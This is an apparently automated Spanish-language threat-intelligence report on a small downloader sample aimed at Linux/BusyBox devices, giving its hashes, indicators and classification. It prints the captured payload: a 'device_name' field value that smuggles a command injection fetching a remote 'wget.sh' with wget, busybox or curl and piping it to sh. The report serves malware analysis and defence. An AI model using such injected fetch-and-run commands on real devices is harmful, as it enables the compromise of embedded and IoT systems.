# 🧬 Payload Analysis

`6cb300c37696af5df93e4e6445377b080fb4bedb92d698509490d7cb5c2a8173`

## 📌 Resumen

Texto ASCII de 205 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh -s lwps`
2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `curl hxxp://91.92.40.XXX/wget.sh`
4. `wget hxxp://91.92.40.XXX/wget.sh -O-`
5. `busybox wget hxxp://91.92.40.XXX` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/6cb300c37696af5df93e4e6445377b080fb4bedb92d698509490d7cb5c2a8173.md](../../../../../malware-like/oraculo/downloader/6cb300c37696af5df93e4e6445377b080fb4bedb92d698509490d7cb5c2a8173.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `6cb300c37696af5df93e4e6445377b080fb4bedb92d698509490d7cb5c2a8173`
- **SHA1:** `b14dfcb70e8019ce5191bb7b1b20f07ed479b8c2`
- **MD5:** `fe381d12dbe724fda540ee78ca8dbf8d`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 205 B |
| Entropía | 4.74 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
device_name=cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bbusybox%20wget%20http://91.92.40.XXX
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lwps | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | device_name=cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bbusybox%20wget%20http://91.92.40.XXX | strings |
| hash | 6cb300c37696af5df93e4e6445377b080fb4bedb92d698509490d7cb5c2a8173 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
